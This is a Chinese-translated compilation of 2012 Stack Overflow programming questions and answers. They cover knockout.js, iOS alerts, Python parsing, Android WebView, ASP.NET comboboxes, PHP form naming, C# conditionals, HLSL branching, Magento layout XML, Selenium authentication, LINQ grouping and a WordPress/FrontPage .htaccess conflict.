# knockout.js - 淘汰赛 js：无法从 foreach 数据绑定单击事件中的数据绑定中的链接打开 mailto 页面

> ID：12460619
> 
> 赞同：3
> 
> 时间：2012-09-17T13:46:13.837
> 
> 标签：knockout.js, viewmodel

我有一个消息列表，我将这些消息的模板绑定到一个点击事件中，然后在这个模板内部我有一个超链接绑定到应该打开一个 mailto 页面的 js 函数。

但是，尽管执行了 js 函数，但单击此链接不会打开页面，如果我右键单击“转到此地址”，它就可以工作。我尝试了许多 KO 方法，如“clickBubble: false”、“controlsDescendantBindings”标志设置为 true、“e.stopImmediatePropagation()”。但都失败了！

这是我的代码的一部分：

（局部视图）

```
<div data-bind="template: { name: 'messageTemplate', foreach: OldMessageCollection}">
...    
</div> 
```

（模板：messageTemplate）

```
<div class="message_listed" data-bind="click: $root.GetSelectedMessage">
...
<ul class="actions_list">
<li><a data-bind="attr: { href: $root.mailToLink(ReplyTo())}"></a></li>
...
</ul>
</div> 
```

ReplyTo() 是 KO 中的 observable，OldMessageCollection 是 observableArray。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-09-28T07:41:40.347

它是使用解决的

```
<a data-bind="attr: { href: $root.mailToLink()}, click: function() {return true;}, clickBubble: false">ReplyTo</a> 
```

# iphone - uialertview clickedButtonAtIndex 消息发送到释放的实例

> ID：12460628
> 
> 赞同：0
> 
> 时间：2012-09-17T13:46:54.307
> 
> 标签：iphone, ios, ipad, uialertview

我在 ViewDidLoad 中创建了一个 UIAlertView，如下所示：

```
 prompt = [[UIAlertView alloc] init];
    prompt.title = @"تسجيل الدخول";
    prompt.message = @"\n\n\n";
    prompt.delegate = self;
    [prompt addButtonWithTitle:@"الغاء"];
    [prompt addButtonWithTitle:@"دخول"];

    userNameTxtField = [[UITextField alloc] initWithFrame:CGRectMake(12.0, 50.0, 260.0, 25.0)];  
    [userNameTxtField setBackgroundColor:[UIColor whiteColor]]; 
    [userNameTxtField setPlaceholder:@"اسم المستخدم"]; 
    [prompt addSubview:userNameTxtField];

    passwordTxtField = [[UITextField alloc] initWithFrame:CGRectMake(12.0, 85.0, 260.0, 25.0)];  
    [passwordTxtField setBackgroundColor:[UIColor whiteColor]]; 
    [passwordTxtField setPlaceholder:@"كلمة المرور"]; 
    [passwordTxtField setSecureTextEntry:YES]; 
    [prompt addSubview:passwordTxtField];

    [prompt show];  
    //[prompt release];

    // set cursor and show keyboard 
    [userNameTxtField becomeFirstResponder]; 
```

clickedButtonAtIndex 函数如下：

```
 -(void)alertView:(UIAlertView *)alertView clickedButtonAtIndex:(NSInteger)buttonIndex{
if (buttonIndex ==0) {
    NSLog(@"cancel");
}else {
    NSLog(@"will login isA");
}
} 
```

但是当我单击任何按钮时，我会看到输出，然后应用程序崩溃并给我以下异常：

```
 [MaktabatyTableViewController respondsToSelector:]: message sent to deallocated instance 0x894cfa0 
```

有什么帮助吗？？？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-17T13:55:23.660

我试过你的代码。您的代码运行良好。

```
-(void)viewDidLoad
{

    UIAlertView *prompt = [[UIAlertView alloc] init];
    prompt.title = @"تسجيل الدخول";
    prompt.message = @"\n\n\n";
    prompt.delegate = self;
    [prompt addButtonWithTitle:@"الغاء"];
    [prompt addButtonWithTitle:@"دخول"];

    UITextField *userNameTxtField = [[UITextField alloc] initWithFrame:CGRectMake(12.0, 50.0, 260.0, 25.0)];
    [userNameTxtField setBackgroundColor:[UIColor whiteColor]];
    [userNameTxtField setPlaceholder:@"اسم المستخدم"];
    [prompt addSubview:userNameTxtField];

    UITextField *passwordTxtField = [[UITextField alloc] initWithFrame:CGRectMake(12.0, 85.0, 260.0, 25.0)];
    [passwordTxtField setBackgroundColor:[UIColor whiteColor]];
    [passwordTxtField setPlaceholder:@"كلمة المرور"];
    [passwordTxtField setSecureTextEntry:YES];
    [prompt addSubview:passwordTxtField];

    [prompt show];
    //[prompt release];

    // set cursor and show keyboard
    [userNameTxtField becomeFirstResponder];
} 
```

# python - 级联字符串拆分，pythonic方式

> ID：12460634
> 
> 赞同：1
> 
> 时间：2012-09-17T13:47:02.947
> 
> 标签：python, python-2.7

以 IANA 的这种格式为例：[http ://www.iana.org/assignments/language-subtag-registry](http://www.iana.org/assignments/language-subtag-registry)

```
%%
Type: language
Subtag: aa
Description: Afar
Added: 2005-10-16
%%
Type: language
Subtag: ab
Description: Abkhazian
Added: 2005-10-16
Suppress-Script: Cyrl
%%
Type: language
Subtag: ae
Description: Avestan
Added: 2005-10-16
%% 
```

假设我打开文件：

```
import urllib
f = urllib.urlopen("http://www.iana.org/assignments/language-subtag-registry")
all=f.read() 
```

通常你会这样做

```
lan=all.split("%%") 
```

迭代局域网，`split("\n")`然后迭代结果和拆分（“：”），有没有办法在没有迭代的情况下在python中批量处理，输出仍然是这样的： `[[["Type","language"],["Subtag", "ae"],...]...]`？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-17T13:50:36.143

如果您在每次拆分后获得的元素在语义上是不同的，那么我认为尝试一次执行此操作没有任何意义。

你可以先用“：”分割——这会让你得到细粒度的数据——但是，如果你不知道这些数据属于什么，那会有什么好处呢？

也就是说，您可以将所有级别的分离放在一个生成器中，并让它与您的数据一起生成字典对象，准备好使用：

```
def iana_parse(data):
    for record in data.split("%%\n"):
        # skip empty records at file endings:
        if not record.strip():
            continue
        rec_data = {}
        for line in record.split("\n"):
            key, value = line.split(":")
            rec_data[key.strip()] = value.strip()
        yield rec_data 
```

它可以按照您在评论中的要求作为一个衬里来完成 - 但正如我评论的那样，它可以写成一行中的单个表达式。编写起来比上面的例子花费了更多的时间，而且几乎不可能维护。上面示例中的代码在几行代码中展开了逻辑，这些代码被放置在“不碍事的地方”——即不是内联实际数据的地方，为这两个任务提供了可读性和可维护性。

也就是说，可以根据需要将其解析为嵌套列表的结构：

```
structure = [[[token.strip() for token in line.split(":")] for line in record.split("\n") ] for record in data.split("%%") if record.strip() ] 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-09-10T10:17:22.513

作为一个单一的理解：

```
raw = """\
%%
Type: language
Subtag: aa
Description: Afar
Added: 2005-10-16
%%
Type: language
Subtag: ab
Description: Abkhazian
Added: 2005-10-16
Suppress-Script: Cyrl
%%
Type: language
Subtag: ae
Description: Avestan
Added: 2005-10-16
%%"""

data = [
     dict(
         row.split(': ')
         for row in item_str.split("\n")
         if row  # required to avoid the empty lines which contained '%%'
     )
     for item_str in raw.split("%%") 
     if item_str  # required to avoid the empty items at the start and end
] 
```

```
>>> data[0]['Added']
'2005-10-16' 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-09-17T13:55:15.957

[正则表达式](http://docs.python.org/py3k/library/re.html?highlight=match#re.split)，但我不明白这一点：

```
re.split('%%|:|\\n', string) 
```

这里使用 or`|`运算符链接了多个模式。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-09-17T13:59:48.110

您可以使用`itertools.groupby`：

```
ss = """%%
Type: language
Subtag: aa
Description: Afar
Added: 2005-10-16
%%
Type: language
Subtag: ab
Description: Abkhazian
Added: 2005-10-16
Suppress-Script: Cyrl
%%
Type: language
Subtag: ae
Description: Avestan
Added: 2005-10-16
"""
sss = ss.splitlines(True) #List which looks like you're iterating over a file object

import itertools

output = []
for k,v in itertools.groupby(sss,lambda x: x.strip() == '%%'):
    if(k):  #Hit a '%%' record.  Need a new group.
        print "\nNew group:\n"
        current = {}
        output.append(current)
    else:   #just a regular record, write the data to our current record dict.
        for line in v:
            print line.strip()
            key,value = line.split(None,1)
            current[key] = value 
```

这个答案的一个好处是它不需要您阅读整个文件。整个表达式被懒惰地评估。

# android - Android Webview 中的后退按钮问题

> ID：12460635
> 
> 赞同：0
> 
> 时间：2012-09-17T13:47:06.723
> 
> 标签：android, android-webview

这个问题很难传达，实际场景将帮助你们理解真正的问题。

在 Android 应用程序中。

我有很多 Jquery Mobile Page 附加到 android Webview。

当我选择一个页面（例如）配置文件时，页面会正确打开，如果我按后退按钮，应用程序将移动到主页，如果我再次选择配置文件并按返回，应用程序会转到登录页面。

如果我选择其他页面并选择配置文件，这不会发生。这个问题不仅与单页有关。在所有页面中我都有同样的问题。有人可以指导我该怎么做吗？

Key Press事件的源代码，这里输入代码

```
 @Override
        public boolean onKeyDown(int keyCode, KeyEvent event) {
    if (keyCode == KeyEvent.KEYCODE_BACK && webview.isEnabled()
            && !this.onLogin) {

        webview.loadUrl("javascript:handleDeviceBack()");
        return true;
    } else if (keyCode == KeyEvent.KEYCODE_BACK && this.onLogin) {
        moveTaskToBack(true);
    }
    if (keyCode == KeyEvent.KEYCODE_HOME) {
        webview.loadUrl("javascript:handleDeviceHome()");
        return true;
    }
    return false;
} 
```

在我的网络视图中，

```
enter code here
 handleDeviceBack = function(status) {
mHealth.util.logMessage('On device Back');
var historyBack = {
    "home" : "page",
    "loginPage" : "page",
    "welcomeMsg" : "page"
};
var moduleIndex = {
    "assessNotFound" : "../../home/view/home.html",
    "showActivity" : "../../home/view/home.html",
    "showMessage" : "../../home/view/home.html",
    "show_tracker" : "../../home/view/home.html",
    "settingsPage" : "../../home/view/home.html"
};
var graphPages = {
    "singlehealthdatapage" : "page",
    "multiplehealthdatapage" : "page"
};
var otherShortcuts = {
    "show_tracker_view" : "../../trackers/view/showtracker.html",
    "detailMessage" : "../../messages/view/showmessage.html",
    "alfrescoDIV" : "../../messages/view/showmessage.html"
};
// var exitAppCriteria={ "home" : "page","loginPage" : "page","welcomeMsg" :
// "page"};

if($('.ui-page-active').attr('id')=="condition_index")
    {
        $.mobile.changePage("../../home/view/history.html");
    }
else if (historyBack[$('.ui-page-active').attr('id')]
        || $('body').children().is('#tandcPage')) {
    Android.finishActivity();
} else if (moduleIndex[$('.ui-page-active').attr('id')]) {
    Android.highlightHome();
    $('.ui-alert-wallpaper').detach();
    $.mobile.changePage(moduleIndex[$('.ui-page-active').attr('id')]);

} else if (graphPages[$('.ui-page-active').attr('id')]) {
    Android.showTab();
    Android.pageHistory();
} else if (otherShortcuts[$('.ui-page-active').attr('id')]) {
    $.mobile.changePage(otherShortcuts[$('.ui-page-active').attr('id')]);
} else {

    $('.dw').detach();
    $('.dwo').detach();
    $('.dw').detach();
    $('.ui-alert-wallpaper').detach();
    Android.showTab();
    Android.pageHistory();
} 
```

};

我发现问题出在 Android.pageHistory();

```
enter code here
    public void pageHistory() {
    this.activity.runOnUiThread(new Runnable() {

        @Override
        public void run() {
            // TODO Auto-generated method stub
            WebContainerActivity.webview.goBack();

        }
    });

} 
```

第一次在哪里正常运行，但如果该函数重复调用 web view.go 返回第一页。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-17T14:08:28.987

在您的活动中覆盖像这样的后压方法

```
 @Override
    public void onBackPressed() {
      webview.loadUrl(sameurl);
        } 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-20T09:47:52.540

通过他们的 ID 对 URL 进行硬编码并暂时解决了问题。

# asp.net - Ajax 工具包组合框中的列表项出现在错误的位置

> ID：12460639
> 
> 赞同：2
> 
> 时间：2012-09-17T13:47:21.777
> 
> 标签：asp.net, combobox

![在此处输入图像描述](../Images/e2be0f8205ed03107a21b5653e0f3b1c.png)

我在网页中有一个 Ajax Toolkit 组合框，它有一个母版页。组合框位于表格内。当网页加载时，该组合框的列表项出现在远离组合框的下方。

解决方法是什么？？:(

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2014-05-10T10:43:48.150

```
.ajax__combobox_itemlist
{
position:absolute!important; 
height: 100px !important;
overflow: auto !important;
top: auto !important;
left: auto !important;
} 
```

它的工作完美....

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-05-29T01:16:20.620

我有同样的问题。这是一个在 ajaxcontrolkit 自动完成扩展器中列出的错误。基本上，列表在页面内放置位置的计算是错误的。

有很多修复方法，但使用起来很痛苦，所以这样做：

```
combobox1_OptionList{
    position: fixed !important
} 
```

它改变了计算的方式，幸运的是使其准确。

注意：如果您的包含 div 将在窗口调整大小时更改位置（例如`left: 10%; top 50%;`），那么当您更改窗口大小时，组合框列表将不会在组合框下方移动并且将被留下。但是，每次触发组合框列表时，都会重新计算其位置，因此添加一个 javascript 事件来调整窗口大小以关闭组合框列表可能会起到作用。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2015-07-08T06:44:22.220

尝试将 ComboBox 包装在 div 中。我有同样的问题。我为每个 ComboBox div 添加了一个类并添加了以下 css。

```
.cbox
{
    margin: 0 auto;
    width: 280px;
} 
```

根据您的喜好设置宽度。Margin: auto 根据宽度将 div 放在父级的中心。

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2012-09-17T14:58:46.390

请看这个样本

[http://www.asp.net/ajaxLibrary/AjaxControlToolkitSampleSite/ComboBox/ComboBox.aspx](http://www.asp.net/ajaxLibrary/AjaxControlToolkitSampleSite/ComboBox/ComboBox.aspx)

组合框已知问题

当指定 ListItemHoverCssClass 并且 ComboBox 列表可滚动时，突出显示列表项将导致滚动条在使用 Internet Explorer Web 浏览器时闪烁。要避免此问题，请不要指定 ListItemHoverCssClass 属性。

如果这不能解决问题，请在评论中提及您的组合框标记

谢谢

# php - 如何在php的循环中为每个文本框分配不同的名称

> ID：12460647
> 
> 赞同：-1
> 
> 时间：2012-09-17T13:47:41.957
> 
> 标签：php

谁能让我知道如何为以下代码循环中的每个文本框分配不同的名称..

```
while($data=mysql_fetch_array( $sql )){ 
    print "<tr><td>".$data['idno']." </td><td>".$data['name'] . " </td><td> <input type=text name=obtmarks</td></tr>";
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-17T13:51:11.293

您可以使用漂亮而简单的计数器：

```
$i=0;
while($data=mysql_fetch_array( $sql )) 
{ 
    echo "<tr><td>".$data['idno']." </td>
        <td>".$data['name'] . " </td>
        <td> <input type='text' name='obtmarks_".$i."'></td></tr>";
    $i++;
} 
```

注意：我还更正了您的开/关括号，并将引号放在需要进入元素的位置。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-17T13:51:46.003

最简单的方法是创建数组中的表单元素。

这[记录在 php.net](http://www.php.net/manual/en/faq.html.php#faq.html.arrays)中。

```
<input name="MyArray[]" />
<input name="MyArray[]" />
<input name="MyArray[]" />
<input name="MyArray[]" /> 
```

因此，您也许可以使用：

```
$fmt = "<tr><td>%s</td><td>%s</td><td>input type='text' name='obtmarks[]'></td></tr>\n";

?><table><tr><th>ID</td><th>Name</th></tr><?php

while ( $data=mysql_fetch_array( $sql ) ) {
    printf($fmt, $data['idno'], $data['name']);
}

?></table> 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-17T13:54:45.753

```
$i = 0;
while($data=mysql_fetch_array( $sql ))
{
    Print "<tr><td>{$data['idno']}</td><td>{$data['name']}</td><td> <input type=\"text\" name=\"obtmarks{$i++}\"/></td></tr>";
} 
```

保持你的代码干净和可读。正确使用 ""、{} 和 ''。

编辑：

```
while($data=mysql_fetch_array( $sql ))
    {
        Print "<tr><td>{$data['idno']}</td><td>{$data['name']}</td><td> <input type=\"text\" name=\"obtmarks[]\"/><input type=\"hidden\" name=\"obtmarks_id[]\" value=\"{$data['idno']}\"/></td></tr>";
    } 
```

然后在第二页你将有 2 个数组在 $_POST 中等待，包含用户输入的 obtmarks[] 和包含相应 ID 的 obtmarks_id[]

```
 $obtmarks = $_POST['obtmarks[]'];
    $obtmarks_id = $_POST['obtmarks_id[]'];

    foreach($obtmarks as $k => $v) {
        // PSEUDO SQL: INSERT $v .... WHERE id=$obtmarks_id[$k]
    } 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-09-17T13:49:44.333

如果名称无关紧要，您可以执行以下简单操作：

```
$counter = 0;
while($data=mysql_fetch_array( $sql )) 
 { 
    print "<tr><td>".$data['idno']." </td><td>".$data['name'] . " </td><td> <input type='text' name='obtmarks{$counter}' /></td></tr>";
    $counter += 1;
 } 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-09-17T13:52:12.480

`<input type=text name=" .$variable." /></td></tr>"`$variable 可能来自 mysql TABLE，具有不同值的字段，或者您可以使用计数器作为下面的答案。

# c# - 基于条件运行方法的快速/简单方法

> ID：12460648
> 
> 赞同：7
> 
> 时间：2012-09-17T13:47:49.170
> 
> 标签：c#, operators

有没有办法运行基于条件语句的方法，如空合并/三元运算符？

有时，我的代码中有这样的内容：

```
if(Extender.GetSetting<string>("User") == null)
{
     ConfigureApp();
}
else
{
     loadUser();
} 
```

有没有办法让我有类似的东西：

```
Extender.GetSettings<string>("User")?? ConfigureApp() : loadUser(); 
```

***或者***

```
Extender.GetSettings<string>("User") == null ? ConfigureApp() : loadUser(); 
```

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-09-17T13:52:47.280

这是可能的，但它不可读。`if`陈述要好得多。

```
(Extender.GetSettings<string>("User") == null ? (Action)ConfigureApp : loadUser)(); 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-09-17T13:53:06.157

你可以写一行：

```
 (Extender.GetSetting<string>("User") == null ? (Action)(()=>ConfigureApp()) : (Action)(()=>loadUser()) )(); 
```

但是，此代码添加到您的`if`语句中的唯一区别是由于委托的构造而导致的性能较慢。这不是一个好主意。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-09-17T14:14:41.767

***简单、快速、快捷的方式。***

```
if (Extender.GetSetting<string>("User") == null) ConfigureApp(); else loadUser(); 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-09-17T13:54:37.530

可能是这样的：

```
class Program {
    static void Main(string[] args) {
        String s = "";
        Launcher(s == "user1", A1, A2);
        s = "user1";
        Launcher(s == "user1", A1, A2);
    }

    static void Launcher(Boolean b, Action a1, Action a2) {
        if (b) { a1(); } else { a2(); }
    }

    static void A1() {
        Console.WriteLine("action 1");
    }

    static void A2() {
        Console.WriteLine("action 2");
    }
} 
```

# optimization - HLSL 分支规避

> ID：12460649
> 
> 赞同：7
> 
> 时间：2012-09-17T13:47:54.680
> 
> 标签：optimization, branch, shader, hlsl

我有一个着色器，我想在顶点着色器中移动一半的顶点。我试图从性能的角度来决定最好的方法，因为我们要处理超过 100,000 个顶点，所以速度至关重要。我看过 3 种不同的方法：（伪代码，但足以给你这个想法。`<complex formula>`我不能给出，但我可以说它涉及一个`sin()`函数，以及一个函数调用（只是返回一个数字，但仍然是一个函数调用），以及一堆关于浮点数的基本算术）。

```
if (y < 0.5)
{
    x += <complex formula>;
} 
```

这样做的好处`<complex formula>`是只执行了一半的时间，但缺点是它肯定会导致一个分支，这实际上可能比公式慢。它是最易读的，但在这种情况下，我们更关心速度而不是可读性。

```
x += step(y, 0.5) * <complex formula>; 
```

使用 HLSL 的 step() 函数（如果第一个参数大于则返回 0，如果小于则返回 1），您可以消除分支，但现在`<complex formula>`每次都调用它，其结果乘以 0（因此浪费精力）一半的时间。

```
x += (y < 0.5) ? <complex formula> : 0; 
```

这个我不知道。`?:`原因是分支吗？如果没有，等式的两边是评估的还是只评估相关的？

最后一种可能性是`<complex formula>`可以将其卸载回 CPU 而不是 GPU，但我担心它在计算 sin() 和其他操作时会变慢，这可能会导致净损失。此外，这意味着必须将另一个数字传递给着色器，这也可能导致开销。任何人都知道哪个是最好的行动方案？

* * *

**附录：**

根据[http://msdn.microsoft.com/en-us/library/windows/desktop/bb509665%28v=vs.85%29.aspx](http://msdn.microsoft.com/en-us/library/windows/desktop/bb509665%28v=vs.85%29.aspx)

该`step()`函数在`?:`内部使用 a ，因此它可能不比我的第 3 个解决方案好，而且可能更糟，因为`<complex formula>`每次肯定都会调用它，而它*可能*只在一半时间被直接调用`?:`。（还没有人回答这部分问题。）虽然避免两者并使用：

```
x += (1.0 - y) * <complex formula>; 
```

可能比他们中的任何一个都好，因为在任何地方都没有进行比较。（并且`y`始终为 0 或 1。）仍然执行`<complex formula>`不必要的一半时间，但完全避免分支可能是值得的。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-09-18T11:38:30.913

或许看看[这个答案](https://stackoverflow.com/a/5362006/165500)。

我的*猜测*（这是一个性能问题：*测量它！*）是您最好不要保留该`if`声明。

`step`原因一：理论上（如果调用正确），着色器编译器应该足够聪明，以便在编译`if`语句时在分支指令和类似于函数的指令之间做出最佳选择。改进它的唯一方法是分析^([1])。请注意，在此粒度级别上，它可能取决于硬件。

[1] 或者，如果您对数据的布局方式有特定的了解，请继续阅读...

原因二是着色器单元的工作方式：如果单元中的一个片段或顶点与其他的分支采用不同的分支，那么着色器单元必须采用两个分支。但如果他们都采用相同的分支 - 另一个分支将被忽略。因此，虽然它是按单元而不是按顶点的 - 仍然有可能跳过昂贵的分支。

对于片段，着色器单元具有屏幕上的局部性 - 这意味着您可以获得最佳性能，附近的像素组都采用相同的分支（请参阅我的[链接答案](https://stackoverflow.com/a/5362006/165500)中的插图）。老实说，我不知道如何将顶点分组为单元 - 但如果您的数据分组适当 - 您应该获得所需的性能优势。

最后：值得指出的是，`<complex formula>`如果您说可以手动将其从 HLSL 中提升出来，那么它很可能会被提升到基于 CPU 的预着色器中（至少在 PC 上，从内存中 Xbox 360 没有'不支持这个，不知道PS3）。您可以通过反编译着色器来检查这一点。如果您只需要每次绘制（而不是每个顶点/片段）计算一次，那么在 CPU 上执行它可能*是*最好的性能。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-08-14T17:05:15.550

我厌倦了我的条件被忽略，所以我只是制作了另一个内核并在 c 执行中进行了覆盖。如果您需要它始终准确，我建议您进行此修复。

# php - 如何通过xml从分层导航中排除类别？

> ID：12460651
> 
> 赞同：2
> 
> 时间：2012-09-17T13:47:58.760
> 
> 标签：php, xml, magento-1.7

我找到了如何在 xml 中执行此操作的建议，但由于它不起作用，我只能通过更改核心/本地代码找到方法，我在此处发布以查看是否有人可以对此有所了解。

这是我发现的建议：

```
<reference name="catalog.leftnav">
    <action method="unsetChild"><alias>category_filter</alias></action>
</reference> 
```

我将此添加到 catalog_category_default 和 _layered 句柄，但没有结果。在检查核心代码时，别名的正确名称似乎应该是 layer_filter_category ，所以我在两个句柄上都改成了这个名称，但这也不起作用。

更绝望的是，我还尝试在另一个参考中嵌套参考以确保它已加载，但我真的不确定这是否正确？

```
<reference name="left">
    <reference name="catalog.leftnav">
        <action method="unsetChild"><alias>layer_filter_category</alias></action>
    </reference>
</reference> 
```

如果有人可以让我知道通过 xml 执行此操作的正确方法，将不胜感激。

提前致谢！

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-09-17T13:56:42.757

如果你想通过 XML 来做，你应该编辑 catalog.xml

代替：

```
<block type="catalog/layer_view" name="catalog.leftnav" 
    after="currency" template="catalog/layer/view.phtml" /> 
```

有了这个：

```
<block type="catalog/layer_view" name="catalog.leftnav" after="currency" template="catalog/layer/view.phtml">  
    <action method="unsetChild"><alias>category_filter</alias></action>
</block> 
```

# java - Selenium RC：加载托管在需要基本身份验证的页面上的资源

> ID：12460655
> 
> 赞同：0
> 
> 时间：2012-09-17T13:48:16.927
> 
> 标签：java, selenium, selenium-rc, basic-authentication

假设我们在站点[http://site1.tld 上](http://site1.tld)，其 HTML 页面 index.html 包含来自另一个站点的图像，例如[http://site2.tld](http://site2.tld)。这个其他站点需要基本身份验证才能访问，我们确实有这些详细信息。

我们正在使用 Selenium RC 并启动 Firefox 15.0.1 浏览器。我们正在 Java 1.7 上编写测试。

我们可以使用 Selenium 使用 username:password@site2.tld URL 导航到受保护的页面，从而允许访问。

我的问题是：有没有办法让 RC 在需要从受保护站点加载资源时使用凭据？

简单地说，它能否“看到”像 http://site2.tld/image.png 这样的 URL，就好像它们是 http://username:password@site2.tld 一样？

@rrufai：您的编辑并没有使我的问题更清楚，因此我将部分还原。但是，由于您确实误解了它，我认为确实有必要进行澄清——我希望 Selenium RC 实际读取 site2.tld 上的文件，就好像它们的位置是 http://username:password@site2.tld。

# sql - LINQ 分组和分组行编辑

> ID：12460660
> 
> 赞同：-2
> 
> 时间：2012-09-17T13:48:27.353
> 
> 标签：sql, vb.net, linq, datatable

我有一个如下所示的数据表

```
╔═══════════════╦═══════════════╦═══════════════╗
║ Product Name  ║ Product Price ║ Product Group ║
╠═══════════════╬═══════════════╬═══════════════╣
║ Skirt Red     ║            99 ║               ║
║ Jeans Blue    ║            49 ║               ║
║ Jeans Black   ║            49 ║               ║
║ Skirt Blue    ║            99 ║               ║
║ T-shirt White ║            20 ║               ║
║ T-shirt Green ║            20 ║               ║
║ Jeans Grey    ║            49 ║               ║
╚═══════════════╩═══════════════╩═══════════════╝ 
```

这只是一个示例数据表，真实数据表具有更复杂的名称和颜色，正如您所看到的，现在使用 LINQ 有不同颜色的类似产品我想让数据表看起来像下面

```
╔═══════════════╦═══════════════╦═══════════════╗
║ Product Name  ║ Product Price ║ Product Group ║
╠═══════════════╬═══════════════╬═══════════════╣
║ Skirt Red     ║            99 ║             1 ║
║ Jeans Blue    ║            49 ║             2 ║
║ Jeans Black   ║            49 ║             2 ║
║ Skirt Blue    ║            99 ║             1 ║
║ T-shirt White ║            20 ║             3 ║
║ T-shirt Green ║            20 ║             3 ║
║ Jeans Grey    ║            49 ║             2 ║
╚═══════════════╩═══════════════╩═══════════════╝ 
```

什么定义了一个组？价格相同，名称无关。

我是 LINQ 的新手，我想知道最好的方法是什么，我正在使用的 Datatable 有大约 112000 条记录

所以基本上，我需要将具有相同价格的产品添加到一个组中，并在每个产品旁边添加一个数字，将点数添加到组中

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-17T14:04:39.993

只需按价格对行进行分组，然后循环遍历组，将组中每一行的组字段设置为组号。

```
Dim query =
    From row in table.AsEnumerable
    Group row By Price = row.Field(Of Integer)("Product Price") Into ProductGroups = Group
Dim grpNumber = 1
For Each grp In query
    For Each row In grp.ProductGroups
        row.SetField("Product Group", grpNumber)
    Next
    grpNumber += 1
Next 
```

# wordpress - htaccess 中的 WordPress 部分会杀死 FrontPage 权限

> ID：12460664
> 
> 赞同：1
> 
> 时间：2012-09-17T13:48:39.203
> 
> 标签：wordpress, .htaccess, frontpage

我在我的网络服务器的 public_html 目录中运行了 WordPress（即我帐户上的主域指向该目录）。此文件夹中有用于其他网站的子目录（例如，“subdomain.com”网站的 /subdomain）。子目录中的一些网站是使用 FrontPage 编辑的。

我发现根目录中的 .htaccess 文件在为 WP 配置时会弄乱 FrontPage 权限并导致无法使用 FrontPage（FrontPage 从不提示进行身份验证并引发 404 错误）。从网络搜索中，我发现其他人遇到了这个问题（例如[https://my.bluehost.com/cgi/help/375](https://my.bluehost.com/cgi/help/375)），但我没有成功实施其他人提出的修复。

以下是详细信息：

## 当此 .htaccess 文件位于根目录时，FrontPage 工作正常：

```
# -FrontPage-

AuthUserFile /home/user/public_html/_vti_pvt/service.pwd
AuthGroupFile /home/user/public_html/_vti_pvt/service.grp

<Limit GET POST>
order deny,allow
deny from all
allow from all
</Limit>
<Limit PUT DELETE>
order deny,allow
deny from all
</Limit>

AuthName myrootdomain.com
IndexIgnore .htaccess */.??* *~ *# */HEADER* */README* */_vti* 
```

* * *

## 我想在这个根 .htaccess 文件中有 WP 部分，并尝试将以下 .htaccess 文件放在顶级 public_html 目录中：

```
#-FrontPage-

AuthUserFile /home/user/public_html/_vti_pvt/service.pwd
AuthGroupFile /home/user/public_html/_vti_pvt/service.grp

<Limit GET POST>
order deny,allow
deny from all
allow from all
</Limit>
<Limit PUT DELETE>
order deny,allow
deny from all
</Limit>

AuthName myrootdomain.com
IndexIgnore .htaccess */.??* *~ *# */HEADER* */README* */_vti*

RewriteRule ^subdir-name/.*$ - [PT] 

ErrorDocument 404 /index.html
<files wp-config.php>
order allow,deny
deny from all
</files>
Options +FollowSymLinks
RewriteEngine On
RewriteCond %{QUERY_STRING} (\<|%3C).*script.*(\>|%3E) [NC,OR]
RewriteCond %{QUERY_STRING} GLOBALS(=|\[|\%[0-9A-Z]{0,2}) [OR]
RewriteCond %{QUERY_STRING} _REQUEST(=|\[|\%[0-9A-Z]{0,2})
RewriteRule ^(.*)$ index.php [F,L]
<IfModule mod_deflate.c>
AddOutputFilterByType DEFLATE text/html text/plain text/xml text/css application/x-javascript application/xhtml+xml application/xml application/rss+xml application/atom_xml application/x-javascript application/x-httpd-php application/x-httpd-fastphp 
BrowserMatch ^Mozilla/4 gzip-only-text/html
BrowserMatch ^Mozilla/4\.0[678] no-gzip
BrowserMatch \bMSIE !no-gzip !gzip-only-text/html
</IfModule>
Options -Indexes
# BEGIN WordPress
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /
RewriteRule ^index\.php$ - [L]
RewriteCond %{REQUEST_FILENAME} !-f
RewriteCond %{REQUEST_FILENAME} !-d
RewriteRule . /index.php [L]
</IfModule>

# END WordPress 
```

* * *

但是，当安装了上述带有 WP 组件的 .htaccess 文件时，它会破坏 FrontPage 身份验证。

我的“subdomainN”（由 FrontPage 编辑的域）的 _vti_bin 文件中的 .htaccess 文件如下所示：

```
# -FrontPage-

Options +FollowSymlinks

<Limit GET POST>
order deny,allow
deny from all
allow from all
</Limit>
<Limit PUT DELETE>
order deny,allow
deny from all
</Limit>
AuthName mydomain.com
AuthUserFile /home/user/public_html/_vti_pvt/service.pwd
AuthGroupFile /home/user/public_html/_vti_pvt/service.grp 
```

* * *

…并且子域 N 的 _vti_aut 和 _vti_adm 子目录中的 .htaccess 文件如下所示：

```
# -FrontPage-

Options +FollowSymlinks

<Limit GET POST>
order deny,allow
deny from all
allow from all
require group authors administrators
</Limit>
<Limit PUT DELETE>
order deny,allow
deny from all
</Limit>
AuthType Passthrough
AuthName myrootdomain.com
AuthUserFile /home/user/public_html/_vti_pvt/service.pwd
AuthGroupFile /home/user/public_html/_vti_pvt/service.grp 
```

* * *

